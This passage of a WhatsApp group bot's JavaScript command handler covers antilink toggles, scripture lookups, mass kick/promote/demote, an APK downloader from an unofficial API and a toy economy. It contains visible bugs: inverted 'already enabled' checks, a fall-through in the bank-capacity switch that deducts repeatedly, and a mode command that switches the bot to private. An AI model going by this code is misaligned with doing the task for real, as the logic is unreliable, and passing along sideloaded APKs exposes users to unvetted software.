    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antifacebook) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antifacebook = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antifacebook) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antifacebook = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break
            case 'antilinktwitter': {
        if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antitwitter) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antitwitter = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antitwitter) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antitwitter = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break  
            case 'antilinktg': {
        if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antitelegram) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antitelegram = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antitelegram) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antitelegram = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break 
            case 'antilinktiktok': {
        if (!m.isGroup) return reply(mess.group)
    if (!isBotAdmins) return reply(mess.botadmin)
    if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
               if (args.length < 1) return reply('*On/Off?*')
               if (args[0] === 'on') {
                if (db.data.chat[frommeky].antititok) return reply('*Feature already on standby*');
                  db.data.chats[frommeky].antitiktok = true
                  reply(`*${command} has been enabled*`)
               } else if (args[0] === 'off') {
               if (db.data.chat[frommeky].antititok) return reply('*Feature has already been disabled*');
                  db.data.chats[frommeky].antitiktok = false
                  reply(`*${command} has been disabled*`)
               }
            }
            break 
              case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} john 3:16*`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`*Please specify the chapter number or name. Example: ${prefix + command} john 3:16*`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    reply(bibleChapter)
  } catch (error) {
    reply(`*Error: Specify a chapter\n*Example: Matthew 7:7*`)
  }
  }
  break
  case 'runtime':
                let pinga = `*Bot Has Been Running For ${runtime(process.uptime())}*`
                ThugBotInc.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.imgur.com/xNJQgbz.jpeg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
       case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`*Please specify the surah number or name*`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`*Couldn't find surah with number or name "${surahInput}"*`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`*API request failed with status ${res.status} and message ${error.message}*`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    reply(quranSurah)

    if (json.data.recitation.full) {
      ThugBotInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    reply(`Error: ${error.message}`)
  }
  }
  break
  case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    reply(gitaVerse)
    if (json.audio_link) {
      ThugBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break     
    case 'hadist': {
if (!text) return reply(`Example : ${prefix + command} abu-dawud 1`)
let hadist = args[0]
let nomer = args[1]
try {
let apiUrl = `https://hadis-api-id.vercel.app/hadith/${hadist}/${nomer}`
let response = await axios.get(apiUrl)
let data = response.data
reply(`*乂 HADIST ${data.name.toUpperCase()}*
${data.arab}

*Translation:* ${data.id}`)
} catch (e) {
console.error(e)
}}
break

case 'kickall': {
    if (!m.isGroup) return reply(mess.group)

    const groupMetadata = await ThugBotInc.groupMetadata(m.chat);
    const groupAdmins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
    const botIsAdmin = groupAdmins.some(a => a.id === ThugBotInc.user.jid);
    const isGroupAdmin = groupAdmins.some(a => a.id === m.sender);

    if (!isBotAdmins) return reply(mess.botadmin)

  if (!isAdmins && !ThugTheCreator) return reply(mess.admin)

    // Filter out admins to avoid kicking them
    const nonAdminMembers = groupMetadata.participants.filter(p => !groupAdmins.some(a => a.id === p.id));

    if (nonAdminMembers.length === 0) {
        return reply(`*There are no members to kick.*`);
    }

    // Kick all non-admin members
    for (let member of nonAdminMembers) {
        try {
            await ThugBotInc.groupParticipantsUpdate(m.chat, [member.id], 'remove');
        } catch (error) {
            console.error(`Failed to kick ${member.id}:`, error);
        }
    }

    reply(`*Successfully removed all non-admin members.*`);
    break;
}

case 'promoteall': {
    try {
        if (!m.isGroup) return reply(mess.group); // Ensure it's a group chat
        if (!isAdmins && !ThugTheCreator) return reply(mess.admin); // Ensure user is admin or the creator
        if (!isBotAdmins) return reply(mess.botadmin); // Ensure bot is admin in the group

        // Get participants that need to be promoted (this function should return a list of participant IDs)
        const participantsToPromote = getParticipants(args, groupMetadata, botNumber, ownernumber);

        // If no participants to promote, send a message
        if (participantsToPromote.length === 0) {
            return reply(`*No participants found to promote.*`);
        }

        // Call the function that updates the participants' roles to 'promote'
        await updateParticipants("promote", participantsToPromote, m.chat);

        // Send success message after promotion
        reply(`*Success: All selected members have been promoted.*`);
    } catch (error) {
        console.error(`Error in 'promoteall':`, error);
        reply(`*An error occurred while processing the 'promoteall' command. Please try again later.*`);
    }
    break;
}

case 'demoteall': {
    try {
        if (!m.isGroup) return reply(mess.group); // Ensure it's a group chat
        if (!isAdmins && !ThugTheCreator) return reply(mess.admin); // Ensure user is admin or the creator
        if (!isBotAdmins) return reply(mess.botadmin); // Ensure bot is admin in the group

        // Fetch group metadata to get participants and their roles
        const groupMetadata = await ThugBotInc.groupMetadata(m.chat);
        const participants = groupMetadata.participants;

        // Filter out participants who are admins and exclude the bot and owner
        const participantsToDemote = participants.filter(p => 
            !p.admin && p.id !== botNumber && p.id !== ownernumber // Only non-admins
        );

        // If no participants to demote, send a message
        if (participantsToDemote.length === 0) {
            return reply(`*No non-admin participants found to demote.*`);
        }

        // Get the IDs of the users to demote
        const participantsToDemoteIds = participantsToDemote.map(p => p.id);

        // Call the function that updates the participants' roles to 'demote'
        await updateParticipants("demote", participantsToDemoteIds, m.chat);

        // Send success message after demotion
        reply(`*Success: All selected members have been demoted.*`);
    } catch (error) {
        console.error(`Error in 'demoteall':`, error);
        reply(`*An error occurred while processing the 'demoteall' command. Please try again later.*`);
    }
    break;
}




            case 'hidetag': {
    if (!m.isGroup) return reply(mess.group);

    try {
        await ThugBotInc.sendMessage(
            m.chat, 
            {
                text: q || '', 
                mentions: participants.map(a => a.id)
            }
        );
    } catch (error) {
        console.error('Hidetag Error:', error);
        reply('*⚠️ An Error Occurred:* ' + error.message);
    }
}
break;

case 'ephemeral': {
                if (!m.isGroup) return reply(mess.group)
               if (!isBotAdmins) return reply(mess.botadmin)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!text) return reply(`*On or Off?*\n*Example: ${prefix+command} on*`)
                if (args[0] === 'on') {
                    await ThugBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await reply(`*Done*`)
                } else if (args[0] === 'off') {
                    await ThugBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await reply(`*Done*`)
                }
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 ThugBotInc.sendMessage(m.chat, { delete: key })
}
break
case 'react': {
                if (!ThugTheCreator) return reply(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                ThugBotInc.sendMessage(m.chat, reactionMessage)
            }
            break

case 'couplepp': case 'ppcouple': {
let anu = require('./database/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
ThugBotInc.sendMessage(frommeky, { image: { url: random.male }, caption: `*Couple pp for male*` }, { quoted: m })
ThugBotInc.sendMessage(frommeky, { image: { url: random.female }, caption: `*Couple pp for female*` }, { quoted: m })
}
break
        case 'apk': {
            if (!isPremium) return replyprem(mess.premium)
            await ThugBotInc.sendMessage(m?.chat, {react: {text: `👾`,key: m?.key,}})
        if (!text) return reply(`*Provide an app you want to download*\n*Example : ${prefix+command} WhatsApp*`);
        await await loading()
      
        try {
          // Fetch APK data from the new API
          let apiUrl = `https://bk9.fun/download/apk?id=${encodeURIComponent(text)}`;
          let response = await fetch(apiUrl);
          let data = await response.json();
      await loading()
          if (data.status !== true) {
            return reply(`*No results found for the APK Name you provided.*`);
          }
      
          let apkData = data.BK9;
      
          // Ensure size is a valid string before parsing it
          let sizeMB = 0;
          if (apkData.size && typeof apkData.size === 'string') {
            sizeMB = parseFloat(apkData.size.replace(' MB', ''));
          }
      
          if (sizeMB > 200) {
            return await ThugBotInc.sendMessage(m.chat, { text: '*The file is too large.*' }, { quoted: m });
          }
      
      // await emoji reaction
      await ThugBotInc.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})
      
          // Send the APK file
          await ThugBotInc.sendMessage(
            m.chat,
            {
              document: { url: apkData.dllink },
              mimetype: 'application/vnd.android.package-archive',
              fileName: apkData.name + '.apk',
              caption: `✨ *APK Details* ✨\n\n📱 *App Name : ${apkData.name}*\n📈 *Last Updated : ${apkData.lastup}*\n📦 *Package Name : ${apkData.package}*\n\n🔥 *Get the latest version now!* 🔥`
            },
            { quoted: m }
          );
        } catch (error) {
          console.error(error);
          return reply(`*An error occurred. Please try again later.*`);
        }
      }
      break;
         case 'dalle': {
    await ThugBotInc.sendMessage(m?.chat, { react: { text: `⌛`, key: m?.key } });

    if (!text) {
        return reply(`*Usage:*\n*A Japanese baby riding a tricycle*`);
    }

    await loading();

    try {
        const apiUrl = `https://api.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;

        // Fetch the image URL first
        const response = await fetch(apiUrl);
        if (!response.ok) {
            throw new Error(`API responded with status: ${response.status}`);
        }

        const imageBuffer = await response.buffer();

        await ThugBotInc.sendMessage(m.chat, {
            image: imageBuffer,
            caption: `🎨 *Image Generator*\n\n📄 *Prompt:* ${text}\n\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™`,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in DALL·E command:', error);
        reply(`*AN ERROR OCCURRED!!*\n\n> ${error.message}`);
    }

    break;
}
  case 'twitter': {
  await ThugBotInc.sendMessage(m?.chat, {react: {text: `📥`,key: m?.key,}})
    if (!args[0]) {
      return reply(`*Provide a Twitter video link*\n*Example :*\n*${prefix + command}* https://twitter.com/username/status/1234567890123456789`);
    }
await loading()
    if (!isUrl(args[0]) || !args[0].includes('x.com')) {
      return reply('*Invalid Twitter link!*');
    }

    try {
      // Fetch data from the new Twitter downloader API
      const response = await axios.get(`https://api.siputzx.my.id/api/d/twitter?url=${encodeURIComponent(text)}${encodeURIComponent(args[0])}`);

      if (!response.data || !response.data.status) {
        return reply('*Unable to fetch data from the link. Please try again later*');
      }

      const { downloadLink, videoDescription, imgUrl } = response.data.data;
  
      await ThugBotInc.sendMessage(m?.chat, {react: {text: `✅`,key: m?.key,}})

      // Send the video itself in the chat
      await ThugBotInc.sendMessage(m.chat, {
        video: { url: downloadLink },
        mimetype: 'video/mp4',
        caption: mess.success
      }, { quoted: m });

    } catch (error) {
      console.error(error);
      reply('*An error occurred while processing your request.*\n*Make sure the link is valid and try again.*');
    }
  }
  break;    
    case 'totalfeature':
        case 'totalcmd': 
        case 'totalcommand': 
            reply(`*Total Features are ${thugfeature()}*`)
        break    
        
   case 'take': {
    if (!m?.quoted) return reply('*Reply to a sticker!*');
    let stiker = false;
    try {
        let [packname, ...author] = text.split('|');
        author = (author || []).join('|');
        let mime = m?.quoted.mimetype || '';
        if (!/webp/.test(mime)) throw '*Reply with a sticker!*';
        
        let img = await m?.quoted.download();
        if (!img) throw '*Failed to download sticker!*';
        
        stiker = await addExif(img, packname || global.packname, author || global.author);
    } catch (e) {
        console.error(e);
        if (Buffer.isBuffer(e)) stiker = e;
        else throw 'An error occurred: ' + e.message;
    } finally {
        if (stiker) {
            await ThugBotInc.sendFile(
                m?.chat,
                stiker,
                'sticker.webp',
                '',
                m,
                false,
                { asSticker: true }
            );
        } else {
            throw '*Conversion failed*';
        }
    }
}
break;

case 'zodiak':
case 'zodiac': {
    if (!q) return reply(`*Example : ${prefix + command} 5 7 2006*`);
    let zodiak = [
        ["capricorn", new Date(1970, 0, 1)],
        ["aquarius", new Date(1970, 0, 20)],
        ["pisces", new Date(1970, 1, 19)],
        ["aries", new Date(1970, 2, 21)],
        ["taurus", new Date(1970, 3, 21)],
        ["gemini", new Date(1970, 4, 21)],
        ["cancer", new Date(1970, 5, 22)],
        ["leo", new Date(1970, 6, 23)],
        ["virgo", new Date(1970, 7, 23)],
        ["libra", new Date(1970, 8, 23)],
        ["scorpio", new Date(1970, 9, 23)],
        ["sagittarius", new Date(1970, 10, 22)],
        ["capricorn", new Date(1970, 11, 22)]
    ].reverse();

    function getZodiac(month, day) {
        let d = new Date(1970, month - 1, day);
        return zodiak.find(([_, _d]) => d >= _d)[0];
    }

    let [day, month, year] = q.split(' ').map(Number);
    if (!day || !month || !year) return reply('*Invalid date format!*');
    
    let zodiac = getZodiac(month, day);
    if (!zodiac) return reply('*Could not determine zodiac!*');
    
    let anu = await primbon.zodiak(zodiac);
    if (!anu.status) return reply(anu.message);
    
    let teks = `
♍ *Zodiac:* ${anu.message.zodiak}
0️⃣ *Lucky Number:* ${anu.message.nomor_keberuntungan}
💨 *Aroma:* ${anu.message.aroma_keberuntungan}
🛸 *Planet:* ${anu.message.planet_yang_mengitari}
🌼 *Flower:* ${anu.message.bunga_keberuntungan}
🌈 *Color:* ${anu.message.warna_keberuntungan}
🌝 *Stone:* ${anu.message.batu_keberuntungan}
☯️ *Element:* ${anu.message.elemen_keberuntungan}
👫 *Compatible Zodiac:* ${anu.message.pasangan_zodiak}
📝 *Notes:* ${anu.message.catatan}`;
    
    reply(teks);
}
break;
case 'meme':
    const memeUrl = "https://meme-api.com/gimme";

    try {
        const memeRes = await axios.get(memeUrl);
        const memeImg = memeRes.data.url;
        const memeTitle = memeRes.data.title;
        await ThugBotInc.sendMessage(m.chat, { image: { url: memeImg }, caption: memeTitle });
    } catch (error) {
        reply("*Failed to fetch a meme.*");
    }
    break;       
     case 'shadow':
case 'write':
case 'romantic':
case 'burnpaper':
case 'smoke':
case 'narutobanner':
case 'love':
case 'undergrass':
case 'doublelove':
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':
{
if (!text) return reply(`*Example : ${prefix + command} Oreki*`);
    reply("*Error!, Server Is Down*")
    await ThugBotInc.sendMessage(m?.chat, {react: {text: `⚠`,key: m?.key,}}) 
let link;
if (/stonetext/.test(command))
link =
  'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html';
if (/writeart/.test(command))
link =
  'photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html';
if (/summertext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html';
if (/wolfmetaltext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html';
if (/nature3dtext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html';
if (/rosestext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/yellow-roses-text-360.html';
if (/naturetypography/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html';
if (/quotesunder/.test(command))
link =
  'photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html';
if (/shinetext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html';
if (/shadow/.test(command))
link =
  'photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html';
if (/write/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html';
if (/romantic/.test(command))
link =
  'photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html';
if (/burnpaper/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html';
if (/smoke/.test(command))
link =
  'photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html';
if (/narutobanner/.test(command))
link =
  'photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html';
if (/love/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html';
if (/undergrass/.test(command))
link =
  'photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html';
if (/doublelove/.test(command))
link =
  'photooxy.com/logo-and-text-effects/love-text-effect-372.html';
if (/coffecup/.test(command))
link =
  'photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html';
if (/underwaterocean/.test(command))
link =
  'photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html';
if (/smokyneon/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html';
if (/starstext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html';
if (/rainboweffect/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html';
if (/balloontext/.test(command))
link =
  'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html';
if (/metalliceffect/.test(command))
link =
  'photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html';
if (/embroiderytext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html';
if (/flamingtext/.test(command))
link =
  'photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
  await loading()
let dehe = await photoOxy(link, text);
ThugBotInc.sendMessage(
m.chat,
{ image: { url: dehe }, caption: `*ᎧᏒᏋᏦᎥ Ꮙ2*`},
{ quoted: m }
);
}
break;  
case 'invite': {
	if (!m.isGroup) return reply(mess.group)
	if (!isBotAdmins) return reply(mess.botadmin)
if (!text) return reply(`*Enter the number you want to invite to the group*\n\n*Example :*\n*${prefix + command}* 916909137213`)
if (text.includes('+')) return reply(`*Enter the number together without +*`)
if (isNaN(text)) return reply(`*Enter the number along side your country code your country code without spaces*`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await ThugBotInc.groupInviteCode(group)
      await ThugBotInc.sendMessage(text+'@s.whatsapp.net', {text: `*GROUP INVITATION*\n\n*A user invites you to join this group*\n\n${link}`, mentions: [m.sender]})
        reply(`*Invitation link sent to user!*`) 
}
break
            case 'close':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                if (args[1] == 'seconds') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minutes') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hours') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply(`*Select:*\n*Seconds*\n*Minutes*\n*Hours*\n\n*Example : ${prefix+command} 10 seconds*`)
                }
                reply(`*Close time starts now!*`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Group has been closed successfully*`
                    ThugBotInc.groupSettingUpdate(m.chat, 'announcement')
                    reply(close)
                }, timer)
                break
            case 'open':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botadmin)
                if (args[1] == 'seconds') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minutes') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hours') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return reply(`*Select:*\n*Seconds*\n*Minutes*\n*Hours*\n\n*Example : ${prefix+command} 10 seconds*`)
                }
                reply(`*Opentime starts now!*`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Group opened successfully*`
                    ThugBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    reply(open)
                }, timer)
                break
                case 'mode': {
      if (!ThugTheCreator) return reply(mess.owner)
     reply(`*Bot current status*\n*Current Mode : ${ThugBotInc.public ? 'Public' : `Self`}*`)
}
case 'self': case 'private': {
                if (!ThugTheCreator) return reply(mess.owner)
                ThugBotInc.public = false
                reply('*Bot status updated*\n*Current mode : Self*')
            }
            break
            case 'public': {
                if (!ThugTheCreator) return reply(mess.owner)
                ThugBotInc.public = true
                reply('*Bot status updated*\n*Current mode : public*')
            }
            break


case 'ssweb': {
    if (!text) return reply(`*Example*: ${prefix + command} https://github.com/DEMONST3R-CODER*`);

    try {
        
        await ThugBotInc.sendMessage(m.chat, { react: { text: `📸`, key: m?.key } });

        // Fetch the screenshot from the API
        const apiUrl = `https://api.davidcyriltech.my.id/ssweb?url=${encodeURIComponent(text)}&device=tablet`;
        const apiResponse = await axios.get(apiUrl);

        
        if (apiResponse.data && apiResponse.data.success) {
            const { screenshotUrl } = apiResponse.data;

        
            await ThugBotInc.sendMessage(m.chat, {
                image: { url: screenshotUrl },
                caption: `🖼️ *Web Screenshot* \n\n*🌐 URL:* ${text}\n*Device: Tablet*\n\n> © 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™`
            }, { quoted: m });
        } else {
            reply(`*Failed to capture the screenshot! Please check the URL and try again.*`);
        }
    } catch (error) {
        
        console.error('Error during ssweb command:', error);
        reply(`*An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
      // economy ...

      case 'daily': case 'claim': case 'reward': {             if (!m.isGroup) return reply(mess.group)
          await ThugBotInc.sendMessage(m?.chat, { react: { text: `💰`, key: m?.key } });
          let user = m.sender
          const cara = "cara"
          const daily = await eco.daily(user, cara, 999); //give 999 for daily, can be changed

          if (daily.cd) return reply(`*You have claimed your reward for the day come back in  ${daily.cdL} time*`); //cdL is already formatted cooldown Left

          reply(`*You claimed ${daily.amount} 💰 today\n*${daily.amount} 💰 has been added to your wallet*`);
        }
        break;

      case 'wallet': case 'purse': {
        if (!m.isGroup) return reply(mess.group)
        await ThugBotInc.sendMessage(m?.chat, { react: { text: `👛`, key: m?.key } })

        if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)

        const user = m.sender

        const cara = "cara"

        const balance = await eco.balance(user, cara); //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.

        await reply(`*Your current balance is : ${balance.wallet} 💰*`);

      }

        break;


      case 'bank': case 'levee': {
        if (!m.isGroup) return reply(mess.grouponly)
        await ThugBotInc.sendMessage(m?.chat, { react: { text: `🏦`, key: m?.key } });

        const user = m.sender
        const cara = "cara"
        const balance = await eco.balance(user, cara); //Returns wallet, bank, and bankCapacity. Also creates a USer if it doesn't exist.
        await reply(`*${pushname}'s bank status :*\n\n*${balance.bank} 💰*\n*Bank capacity : ${balance.bankCapacity} 🏦*`);
      }
        break;


      case 'capacity': case 'bankupgrade': { 
      if (!m.isGroup) return reply(mess.group)

          await ThugBotInc.sendMessage(m?.chat, { react: { text: `🪙`, key: m?.key } });

          //if (!isCreator) return reply(mess.botowner)
          if (!text) return reply(`*💴 Bank capacity*\n\n*1) 1000 sp = 💰100*\n\n*2) 10000 sp = 💰1000*\n\n*3) 100000 sp = 💰10000*\n\n*Example ${prefix}capacity 1 OR ${prefix}bankupgrade 1000*`)
          if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
          const user = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
          const cara = "cara"
          let value = text.trim();
          let k = parseInt(value)
          const balance = await eco.balance(user, cara)
          switch (value) {
            case '1000':
            case '1':
              if (k > balance.wallet) return reply(`*You need to pay 💰 100 to increase bank capacity ~ 1000 sp*`);
              const deduct1 = await eco.deduct(user, cara, 100);
              const add1 = eco.giveCapacity(user, cara, 1000);
              await reply(`*1000 coins 🪙 storage has been added in ${pushname}'s bank*`)
            case '10000':
            case '2':
              if (k > balance.wallet) return reply(`*You need to pay 1000 to increase bank capacity ~ 10000 sp"`);
              const deduct2 = await eco.deduct(user, cara, 1000);
              const add2 = eco.giveCapacity(user, cara, 10000);
              await reply(`*10000 coins 🪙 storage has been added in ${pushname}'s bank*`)
            case '100000':
            case '3':
              if (k > balance.wallet) return reply(`*You need to pay 💰10000 to increase bank capacity ~ 100000 sp*`);
              const deduct3 = await eco.deduct(user, cara, 10000);
              const add3 = eco.giveCapacity(user, cara, 100000);
              await reply(`*100000 coins 🪙 storage has been added in ${pushname}'s bank*`)
          }
        }
        break;


      case 'deposit': case 'pay-in': {
      if (!m.isGroup) return reply(mess.group)
      await ThugBotInc.sendMessage(m?.chat, { react: { text: `📥`, key: m?.key } });

        if (m.quoted?.sender) m.mentionedJid.push(m.quoted.sender)
        if (!text) return reply("*Provide the amount you want to deposit!*");
        const texts = text.trim();
        const user = m.sender;
        const cara = 'cara'
        const deposit = await eco.deposit(user, cara, texts);
        if (deposit.noten) return reply('*You can\'t deposit what you don\'t have.*\n*Check your wallet for your current coin amount*'); //if user states more than whats in his wallet
        reply(`*Successfully Deposited ${deposit.amount} 💰 to your bank.*`)
      }
        break;


